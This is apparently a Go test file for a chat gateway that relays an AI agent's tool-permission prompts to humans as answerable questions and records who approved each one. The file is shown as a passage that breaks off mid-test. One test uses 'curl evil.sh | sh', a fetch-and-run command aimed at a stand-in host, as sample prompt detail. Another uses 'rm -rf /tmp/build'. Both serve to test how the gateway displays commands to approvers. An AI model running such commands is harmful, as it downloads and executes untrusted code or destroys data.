// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/go-steer/switchboard/pkg/approval"
	"github.com/go-steer/switchboard/pkg/chat"
	"github.com/go-steer/switchboard/pkg/daemon"
)

// permsDaemon is a fake core-agent serving the two /perms routes, recording
// what reached them.
type permsDaemon struct {
	srv *httptest.Server

	// streamStatus, when non-zero, is returned instead of a stream — 501 for a
	// session with no broker, 404 for one that is gone.
	streamStatus int
	// prompts are written to every subscriber, in order, as the broker seeds a
	// new one.
	prompts []string
	// respondStatus and respondBody answer POST /perms/respond.
	respondStatus int
	respondBody   string
	// respondOnce makes the broker behave the way a real one does under
	// simultaneous presses: the first answer reaches a pending prompt, and
	// every one after it finds nothing there and 404s.
	respondOnce bool
	// cutAfterPrompts drops the connection once the pending prompts have been
	// written, the way an idle stream through a proxy is cut: the subscriber
	// sees an unexpected EOF, and the next subscription is seeded afresh.
	cutAfterPrompts bool
	// caps is the capabilities frame the event stream opens with, if any.
	caps string

	mu        sync.Mutex
	streams   int
	responded []permsPost
}

// permsPost is one recorded call to /perms/respond.
type permsPost struct {
	caller string
	body   map[string]any
	raw    string
}

func newPermsDaemon(t *testing.T, prompts ...string) *permsDaemon {
	t.Helper()
	d := &permsDaemon{prompts: prompts, respondBody: `{"acknowledged":true,"approver":"presser@example.com"}`}
	mux := http.NewServeMux()
	// The four shipped verbs, so a router can run a real turn against this
	// daemon and reach the perms routes the way it does in production.
	mux.HandleFunc("POST /sessions", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"app":"core-agent","sessionID":"s1"}`)
	})
	mux.HandleFunc("POST /sessions/{app}/{sid}/inject", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, `{}`) })
	mux.HandleFunc("POST /sessions/{app}/{sid}/wake", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, `{}`) })
	mux.HandleFunc("GET /sessions/{app}/{sid}/events", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		w.WriteHeader(http.StatusOK)
		f := w.(http.Flusher)
		d.mu.Lock()
		caps := d.caps
		d.mu.Unlock()
		if caps != "" {
			fmt.Fprintf(w, "event: %s\ndata: %s\n\n", daemon.EventCapabilities, caps)
		}
		f.Flush()
		<-r.Context().Done()
	})
	mux.HandleFunc("GET /sessions/{app}/{sid}/perms/stream", func(w http.ResponseWriter, r *http.Request) {
		d.mu.Lock()
		d.streams++
		status, prompts, cut := d.streamStatus, d.prompts, d.cutAfterPrompts
		d.mu.Unlock()
		if status != 0 {
			w.WriteHeader(status)
			return
		}
		w.Header().Set("Content-Type", "text/event-stream")
		w.WriteHeader(http.StatusOK)
		f := w.(http.Flusher)
		for _, p := range prompts {
			fmt.Fprintf(w, "event: prompt\ndata: %s\n\n", p)
		}
		f.Flush()
		if cut {
			// Close the socket rather than return: a handler that returns ends
			// the chunked body properly and the subscriber reads a clean EOF,
			// which is a different case from the stream being severed.
			conn, _, err := w.(http.Hijacker).Hijack()
			if err != nil {
				t.Errorf("hijack: %v", err)
				return
			}
			conn.Close()
			return
		}
		<-r.Context().Done()
	})
	mux.HandleFunc("POST /sessions/{app}/{sid}/perms/respond", func(w http.ResponseWriter, r *http.Request) {
		raw, _ := io.ReadAll(r.Body)
		var body map[string]any
		_ = json.Unmarshal(raw, &body)
		d.mu.Lock()
		d.responded = append(d.responded, permsPost{
			caller: r.Header.Get("X-Asserted-Caller"),
			body:   body,
			raw:    string(raw),
		})
		status, out := d.respondStatus, d.respondBody
		if d.respondOnce && len(d.responded) > 1 {
			status = http.StatusNotFound
		}
		d.mu.Unlock()
		if status != 0 && status != http.StatusOK {
			w.WriteHeader(status)
			return
		}
		fmt.Fprint(w, out)
	})
	d.srv = httptest.NewServer(mux)
	t.Cleanup(d.srv.Close)
	return d
}

func (d *permsDaemon) streamCount() int {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.streams
}

func (d *permsDaemon) posts() []permsPost {
	d.mu.Lock()
	defer d.mu.Unlock()
	return append([]permsPost(nil), d.responded...)
}

// permsRouter wires a router to the fake daemon with permission relaying on,
// and captures its log lines. Backoff is squeezed so a reconnect test does not
// spend the default on waiting.
func permsRouter(t *testing.T, d *permsDaemon) (*Router, *fakeSender, func() []string) {
	t.Helper()
	cfg := daemon.Config{BaseURL: d.srv.URL, BearerToken: "tok", HTTPClient: d.srv.Client()}
	dc, err := daemon.New(cfg)
	if err != nil {
		t.Fatalf("daemon.New: %v", err)
	}
	ac, err := approval.New(cfg)
	if err != nil {
		t.Fatalf("approval.New: %v", err)
	}
	var mu sync.Mutex
	var lines []string
	// Deep enough that a watcher which reposts the same question on every
	// reconnect trips the assertion rather than blocking on a full channel.
	fake := &fakeSender{replies: make(chan chat.Reply, 64)}
	r := NewRouter(dc, fake, ProgressOff, nil, func(f string, v ...any) {
		mu.Lock()
		defer mu.Unlock()
		lines = append(lines, fmt.Sprintf(f, v...))
	})
	r.setApprovals(ac)
	r.minBackoff = time.Millisecond
	r.maxBackoff = 2 * time.Millisecond
	return r, fake, func() []string {
		mu.Lock()
		defer mu.Unlock()
		return append([]string(nil), lines...)
	}
}

// testSession is the session every fake daemon here hands back.
var testSession = daemon.Session{App: "core-agent", ID: "s1"}

// ref is the decision id the router puts on a question raised by testSession,
// which is what a press has to carry back.
func ref(promptID string) string { return decisionRef(testSession, promptID) }

// liveEntry registers a ready session for a conversation, as a completed turn
// would have.
func liveEntry(r *Router, conv string) *sessionEntry {
	e := &sessionEntry{ready: make(chan struct{}), sess: testSession}
	close(e.ready)
	r.mu.Lock()
	r.sessions[conv] = e
	r.mu.Unlock()
	return e
}

// capsWith builds a capabilities frame that does or does not offer prompts.
func capsWith(perms bool) daemon.Capabilities {
	return daemon.Capabilities{
		ProtocolVersion: "1",
		Server:          "core-agent",
		Features:        map[string]bool{daemon.FeaturePermsStream: perms},
	}
}

const bashPrompt = `{"id":"pr1","kind":"bash","tool":"bash","detail":"rm -rf /tmp/build","verb":"rm"}`

// ------------------------------------------------------------- the trigger

// A session whose agent registered no broker must not be subscribed to: the
// route 501s, and a watcher per session that will never ask is a connection
// spent on nothing.
func TestNoSubscriptionWhenTheSessionOffersNoPrompts(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	r, _, _ := permsRouter(t, d)
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(context.Background(), "C1:1", e, capsWith(false))

	time.Sleep(20 * time.Millisecond)
	if n := d.streamCount(); n != 0 {
		t.Errorf("opened %d prompt streams for a session that offers none", n)
	}
}

// The flag is the whole gate. With relaying off, a session that offers prompts
// must still not be subscribed to — anyone who can post in the conversation
// could otherwise answer them.
func TestNoSubscriptionWhenRelayingIsOff(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	r, _, _ := permsRouter(t, d)
	r.setApprovals(nil)
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(context.Background(), "C1:1", e, capsWith(true))

	time.Sleep(20 * time.Millisecond)
	if n := d.streamCount(); n != 0 {
		t.Errorf("opened %d prompt streams with relaying off", n)
	}
}

// The capabilities frame arrives on every connection, and the event relay
// reconnects. Claiming the watch once is what keeps a flapping relay from
// leaving a watcher behind on each pass — every one of which would post the
// same pending prompt again.
func TestOneWatcherNoMatterHowOftenTheStreamReopens(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	r, fake, _ := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	for range 5 {
		r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))
	}

	<-fake.replies // the one prompt, posted once
	time.Sleep(20 * time.Millisecond)
	if n := d.streamCount(); n != 1 {
		t.Errorf("opened %d prompt streams, want 1", n)
	}
	if extra := len(fake.replies); extra != 0 {
		t.Errorf("posted the same pending prompt %d extra times", extra)
	}
}

// A frame that advertises prompts against a session that serves none is
// permanent, not transient. Retrying it is a loop against a route that will
// 501 forever.
func TestASessionThatContradictsItsOwnFrameIsNotRetried(t *testing.T) {
	d := newPermsDaemon(t)
	d.streamStatus = http.StatusNotImplemented
	r, _, logs := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))

	time.Sleep(50 * time.Millisecond) // many times the 1ms backoff
	if n := d.streamCount(); n != 1 {
		t.Errorf("retried a permanent 501 %d times", n-1)
	}
	if !hasLine(logs(), "serves none") {
		t.Errorf("gave up silently: %v", logs())
	}
}

// A refusal that is not about how the daemon is feeling — a bad token, a
// caller it will not proxy — does not get better on the next attempt. Retrying
// it is a loop that hides the misconfiguration behind a warning every
// millisecond.
func TestAStreamRefusedForGoodIsNotRetried(t *testing.T) {
	d := newPermsDaemon(t)
	d.streamStatus = http.StatusForbidden
	r, _, logs := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))

	time.Sleep(50 * time.Millisecond) // many times the 1ms backoff
	if n := d.streamCount(); n != 1 {
		t.Errorf("retried a permanent refusal %d times", n-1)
	}
	if !hasLine(logs(), "giving up") {
		t.Errorf("gave up silently: %v", logs())
	}
}

// A stream that drops is a prompt nobody sees. Reconnecting is not optional,
// and it needs no cursor: the broker seeds a new subscriber with everything
// still pending.
func TestADroppedStreamIsReopened(t *testing.T) {
	d := newPermsDaemon(t)
	d.streamStatus = http.StatusBadGateway // transient
	r, _, _ := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))

	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		if d.streamCount() > 1 {
			return
		}
		time.Sleep(2 * time.Millisecond)
	}
	t.Fatalf("stream was not reopened after a transient failure (%d attempts)", d.streamCount())
}

// Nothing above proves the watcher is ever reached from a real turn — every
// one of those tests calls it directly. This one runs a turn against a daemon
// whose capabilities frame offers prompts and waits for the question to land,
// which is the only assertion that fails if the wiring in noteCapabilities
// goes away.
func TestARealTurnSubscribesOffTheCapabilitiesFrame(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	d.caps = `{"protocol_version":"1","server":"core-agent","features":{"perms_stream":true}}`
	r, fake, _ := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	if err := r.Handle(ctx, chat.Message{Conversation: "C0:100.1", Caller: "alice@example.com", Text: "hi"}); err != nil {
		t.Fatalf("Handle: %v", err)
	}

	select {
	case reply := <-fake.replies:
		if reply.Kind != chat.KindDecision {
			t.Fatalf("first reply is %q, want the permission question", reply.Kind)
		}
		if reply.Conversation != "C0:100.1" {
			t.Errorf("question landed in %q, not the conversation that asked", reply.Conversation)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("a session offering prompts was never subscribed to")
	}
}

// The same turn against a daemon that offers no prompts must post nothing:
// the frame is the gate, and a session with no broker has no question to ask.
func TestARealTurnWithoutTheFeatureSubscribesToNothing(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	d.caps = `{"protocol_version":"1","server":"core-agent","event_types":["agent"]}`
	r, fake, _ := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	if err := r.Handle(ctx, chat.Message{Conversation: "C0:100.1", Caller: "alice@example.com", Text: "hi"}); err != nil {
		t.Fatalf("Handle: %v", err)
	}

	select {
	case reply := <-fake.replies:
		t.Fatalf("posted %+v for a session that offers no prompts", reply)
	case <-time.After(100 * time.Millisecond):
	}
	if n := d.streamCount(); n != 0 {
		t.Errorf("opened %d prompt streams", n)
	}
}

// -------------------------------------------------------------- the posting

// The question has to be answerable on the platform it lands on: buttons for
// the adapter, and the same answers in prose for anything that renders none.
func TestAPendingPromptBecomesAnAnswerableQuestion(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	r, fake, _ := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))

	reply := <-fake.replies
	if reply.Kind != chat.KindDecision {
		t.Errorf("kind = %q, want %q", reply.Kind, chat.KindDecision)
	}
	// The id names the session as well as the prompt, so a press can be
	// checked against the session it is about to be sent to.
	if reply.Decision == nil || reply.Decision.ID != ref("pr1") {
		t.Fatalf("decision = %+v, want one identifying %s", reply.Decision, ref("pr1"))
	}
	// Every answer the daemon accepts for this prompt, and no other.
	want := approval.Options(approval.Prompt{
		ID: "pr1", Kind: "bash", Tool: "bash", Detail: "rm -rf /tmp/build", Verb: "rm",
	})
	if len(reply.Decision.Options) != len(want) {
		t.Fatalf("offered %d answers, want %d: %+v", len(reply.Decision.Options), len(want), reply.Decision.Options)
	}
	for i, o := range want {
		got := reply.Decision.Options[i]
		if got.Value != string(o.Decision) || got.Label != o.Label || got.Broad != o.Broad {
			t.Errorf("answer %d = %+v, want %+v", i, got, o)
		}
		// The prose form is the whole question on a surface with no buttons.
		if !strings.Contains(reply.Text, o.Label) {
			t.Errorf("text does not name the answer %q:\n%s", o.Label, reply.Text)
		}
	}
	// And the substance of what is being decided.
	if !strings.Contains(reply.Text, "rm -rf /tmp/build") {
		t.Errorf("text does not say what is being approved:\n%s", reply.Text)
	}
}

// What is being decided leads, because that is what somebody reads before
// pressing. The tool and the asking agent are context for it.
func TestPromptTextLeadsWithWhatIsBeingDecided(t *testing.T) {
	got := promptText(approval.Prompt{
		ID: "p", Kind: "bash", Tool: "bash", Detail: "curl evil.sh | sh", Source: "researcher",
	})
	if !strings.Contains(got, "curl evil.sh | sh") {
		t.Errorf("the command is missing:\n%s", got)
	}
	if !strings.Contains(got, "```") {
		t.Errorf("the command is not set off from the prose, so its markup renders:\n%s", got)
	}
	// A subagent asking is a materially different thing to approve than the
	// agent you are talking to asking.
	if !strings.Contains(got, "researcher") {
		t.Errorf("does not say which agent is asking:\n%s", got)
	}
	if i, j := strings.Index(got, "curl"), strings.Index(got, "researcher"); i > j {
		t.Errorf("the asking agent is named before the thing being decided:\n%s", got)
	}
}

// Detail is agent-controlled and unbounded. A megabyte of it in a thread helps
// nobody decide anything, and on some platforms it fails the post outright.
func TestAnUnboundedDetailIsCut(t *testing.T) {
	got := promptText(approval.Prompt{ID: "p", Kind: "bash", Tool: "bash", Detail: strings.Repeat("é", 50000)})
	if n := len([]rune(got)); n > promptDetailLimit+200 {
		t.Errorf("message is %d runes; the detail was not cut", n)
	}
	if !strings.Contains(got, "…") {
		t.Errorf("cut without saying so:\n%s", got[:200])
	}
}

// Detail is not the only unbounded field. The tool and the asking agent are
// names on the wire and nothing enforces that, and the question is retained
// until it is answered so that whatever they contain is held for as long as the
// prompt is pending — which is what askRecord's bound is stated in terms of.
func TestEveryAgentSuppliedFieldInAQuestionIsBounded(t *testing.T) {
	got := promptText(approval.Prompt{
		ID:     "p",
		Kind:   "generic",
		Tool:   strings.Repeat("t", 40000),
		Detail: strings.Repeat("d", 40000),
		Source: strings.Repeat("s", 40000),
	})
	if n := len([]rune(got)); n > promptDetailLimit+2*promptNameLimit+200 {
		t.Errorf("question is %d runes; something in it is not bounded", n)
	}
}

// A prompt with no detail is still a question worth posting: the alternative
// is a turn parked with nothing in the thread to say why.
func TestAPromptWithNoDetailIsStillAsked(t *testing.T) {
	got := promptText(approval.Prompt{ID: "p", Kind: "generic", Tool: "mcp"})
	if !strings.Contains(got, "Permission needed") {
		t.Errorf("says nothing:\n%s", got)
	}
}

// The stream has no keep-alive, so an idle one gets cut routinely, and every
// resubscription is seeded with everything still pending. Without a record of
// what has already been asked, a question nobody has got round to answering
// accumulates one more copy per reconnect, each with its own live buttons.
func TestAQuestionIsAskedOnceHoweverOftenTheStreamIsCut(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	d.cutAfterPrompts = true
	r, fake, _ := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))

	<-fake.replies
	waitFor(t, func() bool { return d.streamCount() > 5 }, "the stream never reopened")
	if n := fake.sendCount(); n != 1 {
		t.Errorf("the same pending question was posted %d times across %d subscriptions, want 1",
			n, d.streamCount())
	}
}

// A question that never made it into the thread is not "already asked". The
// only retry there is is the next reconnect's seeding, so a transient posting
// failure must not become a question nobody is ever shown.
func TestAQuestionThatFailedToPostIsAskedAgain(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	d.cutAfterPrompts = true
	r, fake, _ := permsRouter(t, d)
	fake.failNext(1)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))

	select {
	case <-fake.replies:
	case <-time.After(2 * time.Second):
		t.Fatal("a question whose first post failed was never asked again")
	}
}

// A connection that worked resets the backoff, exactly as the event relay's
// does. Doubling unconditionally pins a session whose stream is cut every few
// minutes at the 30s ceiling, and the next permission question then waits half
// a minute before anybody sees it.
func TestAHealthyStreamDoesNotBackOff(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	d.cutAfterPrompts = true
	r, fake, _ := permsRouter(t, d)
	r.minBackoff = time.Millisecond
	r.maxBackoff = 400 * time.Millisecond
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))
	<-fake.replies

	// Doubling from 1ms reaches the 400ms ceiling after nine reconnects and
	// manages roughly a dozen in this window; holding at the floor manages
	// hundreds. Twenty separates them with room to spare on a slow machine.
	time.Sleep(300 * time.Millisecond)
	if n := d.streamCount(); n < 20 {
		t.Errorf("reopened %d times in 300ms; a healthy stream is backing off as if it were failing", n)
	}
}

// --------------------------------------------------------------- the press

// The press is answered as the person who made it, in the header the daemon's
// caller middleware reads — and the body carries no approver of its own, which
// core-agent would only ever check and 400 on.
func TestAPressIsAnsweredAsWhoeverPressedIt(t *testing.T) {
	d := newPermsDaemon(t)
	r, _, _ := permsRouter(t, d)
	liveEntry(r, "C1:1")

	err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:1", Caller: "presser@example.com",
		DecisionID: ref("pr1"), Option: "allow-once",
	})
	if err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	posts := d.posts()
	if len(posts) != 1 {
		t.Fatalf("got %d responses, want 1", len(posts))
	}
	if posts[0].caller != "presser@example.com" {
		t.Errorf("asserted caller = %q, want the presser", posts[0].caller)
	}
	if posts[0].body["decision"] != "allow-once" || posts[0].body["id"] != "pr1" {
		t.Errorf("body = %v, want the pressed answer to pr1", posts[0].body)
	}
	if strings.Contains(posts[0].raw, "approver") {
		t.Errorf("body claims an approver, which can only earn a 400: %s", posts[0].raw)
	}
}

// The record of what has been asked lives as long as the session does, and a
// long-running one raises prompts indefinitely. Bounded means bounded: the
// worst an overflow may cost is a repeated question, never memory that only
// grows.
func TestTheRecordOfAskedQuestionsIsBounded(t *testing.T) {
	e := &sessionEntry{}
	for i := range maxAskedPrompts + 1 {
		if !e.claimAsk(fmt.Sprintf("pr%d", i), "a question") {
			t.Fatalf("pr%d was refused, and it has not been asked", i)
		}
	}
	if n := len(e.asked); n > maxAskedPrompts {
		t.Errorf("the set holds %d prompts, past its own bound of %d", n, maxAskedPrompts)
	}
}

// Buttons outlive the session they were posted for: a bound session the daemon
// has lost is discarded and the next message in the thread opens a new one,
// leaving the old question on screen still pressable. Answering it against
// whatever session the conversation holds now would apply a decision — possibly
// a standing one — to something that never asked for it.
func TestAPressForASessionTheThreadNoLongerHasIsNotAnswered(t *testing.T) {
	d := newPermsDaemon(t)
	r, fake, logs := permsRouter(t, d)
	liveEntry(r, "C1:1") // holds testSession

	err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:1", Caller: "presser@example.com",
		DecisionID: decisionRef(daemon.Session{App: "core-agent", ID: "gone"}, "pr1"),
		Option:     "allow-always",
	})
	if err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	if posts := d.posts(); len(posts) != 0 {
		t.Fatalf("answered %v against a session that never asked", posts)
	}
	select {
	case got := <-fake.replies:
		if got.Text != noticeStalePress {
			t.Errorf("thread got %q, want the stale-question notice", got.Text)
		}
	default:
		t.Error("nothing was said in the thread: the button flashed and the presser has no way to know the answer went nowhere")
	}
	if !hasLine(logs(), "no longer this conversation's session") {
		t.Errorf("the mismatch was not logged: %v", logs())
	}
}

// Half a decision id is not a decision id. Both halves are load-bearing — the
// session half is what the mismatch check compares — so a reference missing
// either is refused rather than half-applied.
func TestAPressNamingNoPromptIsRefused(t *testing.T) {
	for _, id := range []string{"", "core-agent/s1", "#pr1", "pr1"} {
		d := newPermsDaemon(t)
		r, _, _ := permsRouter(t, d)
		liveEntry(r, "C1:1")

		err := r.HandlePress(context.Background(), chat.Press{
			Conversation: "C1:1", Caller: "presser@example.com",
			DecisionID: id, Option: "allow-once",
		})
		if err == nil {
			t.Errorf("press carrying %q was accepted", id)
		}
		if posts := d.posts(); len(posts) != 0 {
			t.Errorf("press carrying %q answered %v", id, posts)
		}
	}
}

// A press is the one inbound action with no reply of its own. If the answer
// does not reach the daemon and nothing is said, the presser watches an agent
// stay blocked with every appearance of having unblocked it.
func TestAPressThatDidNotReachTheAgentSaysSo(t *testing.T) {
	d := newPermsDaemon(t)
	d.respondStatus = http.StatusBadGateway
	r, fake, _ := permsRouter(t, d)
	liveEntry(r, "C1:1")

	err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:1", Caller: "presser@example.com",
		DecisionID: ref("pr1"), Option: "allow-once",
	})
	if err == nil {
		t.Fatal("HandlePress succeeded on a daemon that refused the answer")
	}
	select {
	case got := <-fake.replies:
		if got.Text != noticePressFailed {
			t.Errorf("thread got %q, want the failed-press notice", got.Text)
		}
		if got.Kind != chat.KindNotice {
			t.Errorf("notice kind = %q, want %q", got.Kind, chat.KindNotice)
		}
	default:
		t.Error("the answer never landed and the thread was not told")
	}
}

// Our own buttons produce our own vocabulary, so anything else is a mangled
// payload. Refusing beats guessing — the nearest wrong guess is an approval.
func TestAPressCarryingSomethingOtherThanADecisionIsRefused(t *testing.T) {
	d := newPermsDaemon(t)
	r, _, _ := permsRouter(t, d)
	liveEntry(r, "C1:1")

	for _, option := range []string{"", "yes", "allow", "ALLOW-ONCE"} {
		err := r.HandlePress(context.Background(), chat.Press{
			Conversation: "C1:1", Caller: "u", DecisionID: ref("pr1"), Option: option,
		})
		if err == nil {
			t.Errorf("press carrying %q was accepted", option)
		}
	}
	if n := len(d.posts()); n != 0 {
		t.Errorf("sent %d answers the daemon never agreed to accept", n)
	}
	// The payload is checked before the session is looked up. Reversing the two
	// reports a mangled press as an expired conversation, which sends whoever
	// reads the log after the wrong thing entirely.
	err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:gone", Caller: "u", DecisionID: ref("pr1"), Option: "yes",
	})
	if err == nil {
		t.Fatal("a mangled press was accepted")
	}
	if !strings.Contains(err.Error(), "yes") {
		t.Errorf("error blames something other than the answer that arrived: %v", err)
	}
}

// A press can only ever answer a question posted into a live conversation, so
// a miss means the session went away in between. Reported, never opened: a new
// session has none of the pending prompts the old one did, and the press would
// answer a question that no longer exists.
func TestAPressWithNoLiveSessionOpensNone(t *testing.T) {
	d := newPermsDaemon(t)
	r, fake, _ := permsRouter(t, d)

	if err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:gone", Caller: "u", DecisionID: ref("pr1"), Option: "deny",
	}); err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	r.mu.Lock()
	n := len(r.sessions)
	r.mu.Unlock()
	if n != 0 {
		t.Errorf("the press created %d sessions", n)
	}
	if len(d.posts()) != 0 {
		t.Error("a press with no session to answer was sent to the daemon anyway")
	}
	// The buttons are on screen and still pressable, and there is no message to
	// write the outcome onto, so the press has to be answered beside them.
	if got := drainNotice(t, fake); got != noticeStalePress {
		t.Errorf("the thread was told %q, want %q", got, noticeStalePress)
	}
}

// Someone else answered first, or the prompt timed out. Either way the
// question is settled, and reporting it as a failure would put an error in
// the thread for a decision that was already made.
func TestAPromptThatIsNoLongerPendingIsNotAFailure(t *testing.T) {
	d := newPermsDaemon(t)
	d.respondStatus = http.StatusNotFound
	r, _, logs := permsRouter(t, d)
	liveEntry(r, "C1:1")

	if err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:1", Caller: "u", DecisionID: ref("pr1"), Option: "deny",
	}); err != nil {
		t.Errorf("a settled prompt was reported as a failure: %v", err)
	}
	if !hasLine(logs(), "no longer pending") {
		t.Errorf("settled silently: %v", logs())
	}
}

// The decision applied but the audit line names nobody. That is a real answer,
// not an error — and it is the exact hole an approval trail exists to prevent,
// so it does not pass unremarked.
func TestAnApprovalNobodyIsNamedOnIsRecordedAsSuch(t *testing.T) {
	d := newPermsDaemon(t)
	d.respondBody = `{"acknowledged":true}`
	r, _, logs := permsRouter(t, d)
	liveEntry(r, "C1:1")

	if err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:1", Caller: "u", DecisionID: ref("pr1"), Option: "allow-once",
	}); err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	if !hasLine(logs(), "no approver named") {
		t.Errorf("an unattributed approval left no trace: %v", logs())
	}
}

// Platforms redeliver and people click twice. The second press is the same
// answer to the same question, which the daemon settles as already-answered —
// it must not surface as an error either time.
func TestPressingTwiceIsNotAnError(t *testing.T) {
	d := newPermsDaemon(t)
	r, _, _ := permsRouter(t, d)
	liveEntry(r, "C1:1")

	p := chat.Press{Conversation: "C1:1", Caller: "u", DecisionID: ref("pr1"), Option: "deny"}
	if err := r.HandlePress(context.Background(), p); err != nil {
		t.Fatalf("first press: %v", err)
	}
	d.mu.Lock()
	d.respondStatus = http.StatusNotFound // settled by the first
	d.mu.Unlock()
	if err := r.HandlePress(context.Background(), p); err != nil {
		t.Errorf("second press: %v", err)
	}
}

// A gateway with relaying off renders no buttons, so a press against it is
// either a stale message or something else's payload. It is refused rather
// than answered.
func TestAPressAgainstAGatewayWithRelayingOffIsRefused(t *testing.T) {
	d := newPermsDaemon(t)
	r, _, _ := permsRouter(t, d)
	r.setApprovals(nil)
	liveEntry(r, "C1:1")

	if err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:1", Caller: "u", DecisionID: ref("pr1"), Option: "deny",
	}); err == nil {
		t.Error("a press was answered by a gateway that relays no prompts")
	}
	if n := len(d.posts()); n != 0 {
		t.Errorf("sent %d answers anyway", n)
	}
}

func hasLine(lines []string, want string) bool {
	for _, l := range lines {
		if strings.Contains(l, want) {
			return true
		}
	}
	return false
}

// ------------------------------------------------- the record left behind

// askedPress builds a press against a question the entry has actually posted,
// which is what a real one always is — the record of what was asked is what the
// edit writes underneath.
func askedPress(e *sessionEntry, promptID, option, body string) chat.Press {
	e.claimAsk(promptID, body)
	return chat.Press{
		Conversation: "C1:1",
		Caller:       "presser@example.com",
		DecisionID:   ref(promptID),
		Option:       option,
		Message:      chat.MessageRef{Conversation: "C1:1", ID: "ts1"},
	}
}

// The whole path, with nothing stubbed in the middle: a prompt arrives on the
// stream, becomes a question, and a press turns that question into the record
// of how it was answered. What the other tests here shortcut is the part where
// the question posted and the question quoted back are the same one.
func TestTheQuestionAskedIsTheQuestionTheRecordKeeps(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	r, fake, _ := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))
	posted := <-fake.replies

	err := r.HandlePress(ctx, chat.Press{
		Conversation: "C1:1", Caller: "presser@example.com",
		DecisionID: ref("pr1"), Option: "allow-once",
		Message: chat.MessageRef{Conversation: "C1:1", ID: "ts1"},
	})
	if err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	ups := fake.updatedCalls()
	if len(ups) != 1 {
		t.Fatalf("got %d edits, want the posted question edited once", len(ups))
	}
	// Not merely "some text with the command in it" — the question that was
	// actually put in the thread, minus the prose list of answers nobody can
	// press any more.
	want := strings.TrimSuffix(posted.Text, "\n\n"+chat.DecisionText(posted.Decision))
	if !strings.HasPrefix(ups[0].text, want) {
		t.Errorf("the record does not open with the question that was asked.\nasked:  %q\nrecord: %q", want, ups[0].text)
	}
	if !strings.Contains(ups[0].text, "presser@example.com") {
		t.Errorf("the record names nobody: %q", ups[0].text)
	}
}

// A question with live buttons and no sign of having been answered is the state
// this whole feature is supposed to leave the thread out of. Whoever scrolls
// past it later has to be able to see that it was settled, by whom, and how.
func TestAnAnsweredQuestionSaysWhoAnsweredIt(t *testing.T) {
	d := newPermsDaemon(t)
	r, fake, _ := permsRouter(t, d)
	e := liveEntry(r, "C1:1")
	p := askedPress(e, "pr1", "allow-once", "**Permission needed** — `bash`\n\n```\nrm -rf /tmp/build\n```")

	if err := r.HandlePress(context.Background(), p); err != nil {
